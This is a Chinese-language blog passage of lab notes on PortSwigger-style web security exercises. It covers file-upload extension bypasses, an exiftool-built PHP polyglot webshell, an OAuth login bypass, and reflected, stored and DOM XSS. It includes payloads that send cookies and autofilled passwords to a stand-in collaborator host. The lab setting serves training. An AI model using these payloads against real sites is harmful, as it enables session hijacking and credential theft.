<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302154805409.png" alt="image-20230302154805409"></p>
<h3 id="混淆文件扩展名"><a href="#混淆文件扩展名" class="headerlink" title="混淆文件扩展名"></a>混淆文件扩展名</h3><ul>
<li>提供多个扩展：exploit.php.jpg</li>
<li>添加尾随字符绕过：一些组件会去除或忽略尾随的空格、点等: exploit.php.</li>
<li>尝试对点、正斜杠和反斜杠使用 URL 编码（或双重 URL 编码）</li>
<li>在文件扩展名前添加分号或 URL 编码的空字节字符。如果验证是用 PHP 或 Java 等高级语言编写的，但服务器使用 C/C++ 中的低级函数处理文件，例如，这可能会导致文件名末尾的差异：<code>exploit.asp;.jpg</code>或<code>exploit.asp%00.jpg</code></li>
<li>尝试使用多字节 unicode 字符，这些字符在 unicode 转换或规范化后可能会转换为空字节和点。<code>xC0 x2E</code>如果文件名被解析为 UTF-8 字符串，但在用于路径之前转换为 ASCII 字符，则像 , <code>xC4 xAE</code>or这样的序列<code>xC0 xAE</code>可能会被翻译成<code>x2E</code></li>
<li>双写绕过：exploit.p.phphp</li>
</ul>
<h4 id="LAB-通过混淆文件扩展名上传webshell"><a href="#LAB-通过混淆文件扩展名上传webshell" class="headerlink" title="LAB: 通过混淆文件扩展名上传webshell"></a>LAB: 通过混淆文件扩展名上传webshell</h4><p>发现只有png和jpg格式能上传<img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302155905244.png" alt="image-20230302155905244"></p>
<p>双后缀名绕过试一试</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302160000913.png" alt="image-20230302160000913"></p>
<p>发现没法读取文件</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302160042153.png" alt="image-20230302160042153"></p>
<p>然后我们用<code>%00</code>截断尝试一下</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302160304835.png" alt="image-20230302160304835"></p>
<p>成功读取文件</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302160318775.png" alt="image-20230302160318775"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302160359973.png" alt="image-20230302160359973"></p>
<h3 id="文件内容验证有缺陷"><a href="#文件内容验证有缺陷" class="headerlink" title="文件内容验证有缺陷"></a>文件内容验证有缺陷</h3><p>在图像上传功能的情况下，服务器可能会尝试验证图像的某些固有属性，例如尺寸。例如，如果您尝试上传一个 PHP 脚本，它根本就没有任何尺寸。因此，服务器可以推断它不可能是图片，并据此拒绝上传。</p>
<p>同样，某些文件类型可能始终在其页眉或页脚中包含特定的字节序列。这些可以像指纹或签名一样用于确定内容是否与预期类型匹配。例如，JPEG 文件总是以字节开头<code>FF D8 FF</code>。</p>
<p>这是验证文件类型的更可靠的方法，但即使这样也不是万无一失的。使用 ExifTool 等特殊工具，可以轻松创建在其元数据中包含恶意代码的多语言 JPEG 文件。</p>
<h4 id="LAB-通过多语言webshell上传远程代码执行"><a href="#LAB-通过多语言webshell上传远程代码执行" class="headerlink" title="LAB: 通过多语言webshell上传远程代码执行"></a>LAB: 通过多语言webshell上传远程代码执行</h4><p>利用exiftool工具  生成一个具有jpg十六进制格式的php文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool -Comment=&quot;&lt;?php echo &#x27;START &#x27; . file_get_contents(&#x27;/home/carlos/secret&#x27;) . &#x27; END&#x27;; ?&gt;&quot; logo.jpg -o p.php</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302230131973.png" alt="image-20230302230131973"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302230127778.png" alt="image-20230302230127778"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230302230303778.png" alt="image-20230302230303778"></p>
<h1 id="OAuth2-0身份验证漏洞"><a href="#OAuth2-0身份验证漏洞" class="headerlink" title="OAuth2.0身份验证漏洞"></a>OAuth2.0身份验证漏洞</h1><h3 id="1-通过0Auth隐式流程绕过身份验证"><a href="#1-通过0Auth隐式流程绕过身份验证" class="headerlink" title="1.通过0Auth隐式流程绕过身份验证"></a>1.通过0Auth隐式流程绕过身份验证</h3><p>很简单，只需要抓包将登录内容修改即可</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222140405478.png"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230222140551360.png" alt="image-20230222140551360"></p>
<h1 id="XSS-Cross-site-scripting"><a href="#XSS-Cross-site-scripting" class="headerlink" title="XSS[Cross-site scripting]"></a>XSS<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting">[Cross-site scripting]</a></h1><h2 id="三种最流行、最强大的利用场景："><a href="#三种最流行、最强大的利用场景：" class="headerlink" title="三种最流行、最强大的利用场景："></a>三种最流行、最强大的利用场景：</h2><ul>
<li>利用xss窃取用户的cookie</li>
</ul>
<h3 id="窃取cookie"><a href="#窃取cookie" class="headerlink" title="窃取cookie"></a>窃取cookie</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"> </span></span><br><span class="line"><span class="javascript">    fetch(<span class="string">&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;</span>, </span></span><br><span class="line"><span class="javascript">          &#123; <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, </span></span><br><span class="line"><span class="javascript">           <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, </span></span><br><span class="line"><span class="javascript">           <span class="attr">body</span>:<span class="built_in">document</span>.cookie &#125;</span></span><br><span class="line"><span class="javascript">         );</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221210160534982.png" alt="image-20221210160534982"></p>
<p>将cookie替换成带出的这个，就可以成功模拟用户</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221210160042940.png" alt="image-20221210160042940"></p>
<ul>
<li>利用xss读取自动填充的密码</li>
</ul>
<h3 id="获取自动填充密码"><a href="#获取自动填充密码" class="headerlink" title="获取自动填充密码"></a>获取自动填充密码</h3><p>需要监控输入框的变化，所以我们引入了onchange事件</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">username</span> <span class="attr">id</span>=<span class="string">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span> <span class="attr">onchange</span>=<span class="string">&quot;if(this.value.length)fetch(&#x27;https://BURP-COLLABORATOR-SUBDOMAIN&#x27;,&#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">	method:&#x27;POST&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">	mode: &#x27;no-cors&#x27;,</span></span></span><br><span class="line"><span class="string"><span class="tag">	body:username.value+&#x27;:&#x27;+this.value</span></span></span><br><span class="line"><span class="string"><span class="tag">	&#125;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221210164718472.png"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221210164936524.png" alt="image-20221210164936524"></p>
<ul>
<li>利用xss执行CSRF漏洞  </li>
</ul>
<h3 id="执行CSRF"><a href="#执行CSRF" class="headerlink" title="执行CSRF"></a>执行CSRF</h3><h3 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h3><p>题目：将 XSS 反射到 HTML 上下文中，不进行任何编码</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/t017af6c064a82629f8.png" alt="img"></p>
<p>先看一下利用点 </p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207141922676.png" alt="image-20221207141922676"></p>
<p>可以看到我们输入的111直接被嵌入html代码中，这样便可以进行利用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207141623688.png" alt="image-20221207141623688"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207141749569.png" alt="image-20221207141749569"></p>
<h3 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="2.存储型XSS"></a>2.存储型XSS</h3><p>题目：将 XSS 存储到 HTML 上下文中，不进行任何编码</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207142231268.png" alt="image-20221207142231268"></p>
<p>题目描述中说明了XSS点是在评论区，这个过程真实情况中应该是我们自己测一下    </p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207142413780.png" alt="image-20221207142413780"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207142708794.png" alt="image-20221207142708794"></p>
<p>可以看到这种XSS漏洞是直接将将输入嵌入html编码  并且可以存储在该页面</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207142841287.png" alt="image-20221207142841287"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207142935863.png" alt="image-20221207142935863"></p>
<p>因此当我们之后访问该网站的时候  经过浏览器对html编码的渲染  就会触发我们输入的恶意代码</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207143038224.png" alt="image-20221207143038224"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207143437755.png" alt="image-20221207143437755"></p>
<h3 id="反射型和存储型的区别"><a href="#反射型和存储型的区别" class="headerlink" title="反射型和存储型的区别"></a>反射型和存储型的区别</h3><p>虽然两种XSS都会将接收的数据映射到响应中，但是入口点不同，存储型的入口点是数据库，反射型的入口点是HTTP请求</p>
<p>反射型是在请求响应的时候会触发，而存储型实际上是在访问该存储xss代码的网页时html渲染所致</p>
<h3 id="3-基于DOM型XSS-location-search-gt-document-write"><a href="#3-基于DOM型XSS-location-search-gt-document-write" class="headerlink" title="3.基于DOM型XSS: location.search-&gt;document.write"></a>3.基于DOM型XSS: location.search-&gt;document.write</h3><p><strong>DOM有一个source和sink，可以理解为DOM操作函数的入口点和出口点，基于DOM的XSS就是因为将入口点的输入传递给出口点的时候被出口点函数执行导致的XSS。常见的source就是URL了，搭配window.location对象访问操作sink触发。</strong></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207144437755.png" alt="image-20221207144437755"></p>
<p>拼接也无果</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207145241700.png" alt="image-20221207145241700"></p>
<p>能否成功利用基于DOM的XSS还是要看source和sink是否搭配，这是一个组合的问题</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221207191215516.png" alt="image-20221207191215516"></p>
<p>上面模拟了一个利用document.write进行写参</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208205136689.png" alt="image-20221208205136689"></p>
<p>window.location 对象所包含的属性</p>
<table>
<thead>
<tr>
<th align="left">属性</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">hash</td>
<td align="left">从井号 (#) 开始的 URL（锚）</td>
</tr>
<tr>
<td align="left">host</td>
<td align="left">主机名和当前 URL 的端口号</td>
</tr>
<tr>
<td align="left">hostname</td>
<td align="left">当前 URL 的主机名</td>
</tr>
<tr>
<td align="left">href</td>
<td align="left">完整的 URL</td>
</tr>
<tr>
<td align="left">pathname</td>
<td align="left">当前 URL 的路径部分</td>
</tr>
<tr>
<td align="left">port</td>
<td align="left">当前 URL 的端口号</td>
</tr>
<tr>
<td align="left">protocol</td>
<td align="left">当前 URL 的协议</td>
</tr>
<tr>
<td align="left">search</td>
<td align="left">从问号 (?) 开始的 URL（查询部分）</td>
</tr>
</tbody></table>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208205627982.png" alt="image-20221208205627982"></p>
<p>说明<code>query</code>这个是获取参数search的值</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208205804470.png" alt="image-20221208205804470"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208205037414.png" alt="image-20221208205037414"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;&quot;</span><br><span class="line">    </span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208211027630.png" alt="image-20221208211027630"></p>
<h3 id="4-基于DOM型XSS-location-search-gt-innerHTML"><a href="#4-基于DOM型XSS-location-search-gt-innerHTML" class="headerlink" title="4.基于DOM型XSS: location.search-&gt;innerHTML"></a>4.基于DOM型XSS: location.search-&gt;innerHTML</h3><p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208214923004.png" alt="image-20221208214923004"></p>
<p>可以发现innerHTML不支持script和svg标签</p>
<p>能发现innerHTML直接将query值 也就是search传入 嵌入html代码中</p>
<p>所以可以直接嵌入标签</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208215146751.png" alt="image-20221208215146751"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208215336310.png" alt="image-20221208215336310"></p>
<h3 id="5-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#5-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="5.DOM XSS in jQuery anchor href attribute sink using location.search source"></a>5.DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h3><p>测试发现 returnPath 的值就是点击back返回的地址</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208220150142.png" alt="image-20221208220150142"></p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208220310268.png"></p>
<p>测试闭合  发现成功了呜呜</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20221208220509171.png" alt="image-20221208220509171"></p>
<p>但当测试cookie的时候失败了  说明这样只是self xss   没有本质的用途</p>
<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/1706496-20200523141748897-1961227083.png" alt="img"></p>
<p>修改的是<code>href</code>标签：用JS伪协议</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.cookie)</span><br></pre></td></tr></table></figure>

<h4 id><a href="#" class="headerlink" title></a></h4></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://css0k.github.io">css_0k</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://css0k.github.io/2023/02/18/burpsuite%E9%9D%B6%E5%9C%BA-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF/">https://css0k.github.io/2023/02/18/burpsuite%E9%9D%B6%E5%9C%BA-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/cf0178179a524ebdb423461adb3c3e8c.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/01/31/selenium%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/"><img class="next-cover" src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/a93bec374a704e27ba9dd76c8c0961c3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">selenium自动化</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s1.ax1x.com/2022/05/07/OlMpE4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">css_0k</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">32</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/css0k/css0k.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1327246897@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-WHERE-%E5%AD%90%E5%8F%A5%E4%B8%AD%E5%85%81%E8%AE%B8%E6%A3%80%E7%B4%A2%E9%9A%90%E8%97%8F%E6%95%B0%E6%8D%AE%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.WHERE 子句中允许检索隐藏数据的 SQL 注入漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%85%81%E8%AE%B8%E7%BB%95%E8%BF%87%E7%99%BB%E5%BD%95%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-%E5%B9%B2%E6%89%B0%E7%99%BB%E5%BD%95%E9%80%BB%E8%BE%91"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.允许绕过登录的 SQL 注入漏洞__干扰登录逻辑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-SQL%E6%B3%A8%E5%85%A5UNION%E6%94%BB%E5%87%BB%EF%BC%8C%E7%A1%AE%E5%AE%9A%E6%9F%A5%E8%AF%A2%E8%BF%94%E5%9B%9E%E7%9A%84%E5%88%97%E6%95%B0"><span class="toc-number">1.0.3.</span> <span class="toc-text">3.SQL注入UNION攻击，确定查询返回的列数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-SQL-%E6%B3%A8%E5%85%A5-UNION-%E6%94%BB%E5%87%BB%EF%BC%8C%E6%9F%A5%E6%89%BE%E5%8C%85%E5%90%AB%E6%96%87%E6%9C%AC%E7%9A%84%E5%88%97"><span class="toc-number">1.0.4.</span> <span class="toc-text">4.SQL 注入 UNION 攻击，查找包含文本的列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-SQL%E6%B3%A8%E5%85%A5UNION%E6%94%BB%E5%87%BB%EF%BC%8C%E4%BB%8E%E5%85%B6%E4%BB%96%E8%A1%A8%E4%B8%AD%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE"><span class="toc-number">1.0.5.</span> <span class="toc-text">5.SQL注入UNION攻击，从其他表中获取数据</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-SQL-%E6%B3%A8%E5%85%A5-UNION-%E6%94%BB%E5%87%BB%EF%BC%8C%E5%9C%A8%E5%8D%95%E4%B8%AA%E5%88%97%E4%B8%AD%E6%A3%80%E7%B4%A2%E5%A4%9A%E4%B8%AA%E5%80%BC"><span class="toc-number">1.0.6.</span> <span class="toc-text">6.SQL 注入 UNION 攻击，在单个列中检索多个值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%EF%BC%8C%E6%9F%A5%E8%AF%A2Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B1%BB%E5%9E%8B%E5%92%8C%E7%89%88%E6%9C%AC"><span class="toc-number">1.0.7.</span> <span class="toc-text">7.SQL注入攻击，查询Oracle数据库类型和版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-SQL-injection-attack-querying-the-database-type-and-version-on-MySQL-and-Microsoft"><span class="toc-number">1.0.8.</span> <span class="toc-text">8. SQL injection attack, querying the database type and version on MySQL and Microsoft</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases"><span class="toc-number">1.0.9.</span> <span class="toc-text">9.SQL injection attack, listing the database contents on non-Oracle databases</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-SQL-injection-attack-listing-the-database-contents-on-Oracle"><span class="toc-number">1.0.10.</span> <span class="toc-text">10.SQL injection attack, listing the database contents on Oracle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-Blind-SQL-injection-with-conditional-responses"><span class="toc-number">1.0.11.</span> <span class="toc-text">11.Blind SQL injection with conditional responses</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-Blind-SQL-injection-with-conditional-errors-%E5%85%B7%E6%9C%89%E6%9D%A1%E4%BB%B6%E9%94%99%E8%AF%AF%E7%9A%84SQL%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.12.</span> <span class="toc-text">12.Blind SQL injection with conditional errors  具有条件错误的SQL盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#About-11-amp-12"><span class="toc-number">1.0.13.</span> <span class="toc-text">About  11&amp;12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-Blind-SQL-injection-with-time-delays-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.14.</span> <span class="toc-text">13.Blind SQL injection with time delays  时间盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E5%85%B7%E6%9C%89%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E5%92%8C%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2%E7%9A%84%E7%9B%B2-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.15.</span> <span class="toc-text">14. 具有时间延迟和信息检索的盲 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-Lab-Blind-SQL-injection-with-time-delays-and-information-retrieval%E5%85%B7%E6%9C%89%E6%97%B6%E9%97%B4%E5%BB%B6%E8%BF%9F%E5%92%8C%E4%BF%A1%E6%81%AF%E6%A3%80%E7%B4%A2%E7%9A%84%E7%9B%B2-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.16.</span> <span class="toc-text">15.Lab: Blind SQL injection with time delays and information retrieval具有时间延迟和信息检索的盲 SQL 注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-OOB%EF%BC%88Out-of-Band%EF%BC%89%E5%B8%A6%E5%A4%96%E9%80%9A%E4%BF%A1%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.17.</span> <span class="toc-text">16.OOB（Out-of-Band）带外通信注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE%E6%B8%97%E6%BC%8F%E7%9A%84-SQL-%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.0.18.</span> <span class="toc-text">17.带外数据渗漏的 SQL 盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-%E9%80%9A%E8%BF%87-XML-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8%E7%9A%84-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.0.19.</span> <span class="toc-text">18.通过 XML 编码绕过过滤器的 SQL 注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">身份验证漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.</span> <span class="toc-text">身份验证机制中的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.1.</span> <span class="toc-text">基于密码登录的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Username-enumeration-via-response-timing"><span class="toc-number">2.1.1.0.1.</span> <span class="toc-text">Username enumeration via response timing</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E5%A4%B1%E8%B4%A5%E9%99%90%E5%88%B6"><span class="toc-number">2.1.1.0.2.</span> <span class="toc-text">绕过失败限制</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AF%8F%E4%B8%AA%E8%AF%B7%E6%B1%82%E5%A4%9A%E4%B8%AA%E5%87%AD%E6%8D%AE"><span class="toc-number">2.1.1.0.3.</span> <span class="toc-text">每个请求多个凭据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E9%87%8D%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.2.</span> <span class="toc-text">多重身份验证中的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2FA%E7%A0%B4%E7%8E%AF%E9%80%BB%E8%BE%91"><span class="toc-number">2.1.2.0.1.</span> <span class="toc-text">2FA破环逻辑</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%9A%B4%E5%8A%9B%E6%94%BB%E5%87%BB%E7%BB%95%E8%BF%872FA"><span class="toc-number">2.1.2.0.2.</span> <span class="toc-text">使用暴力攻击绕过2FA</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6%E4%B8%AD%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.3.</span> <span class="toc-text">其他身份验证机制中的漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%9D%E6%8C%81%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-number">2.1.3.1.</span> <span class="toc-text">保持用户登录</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" 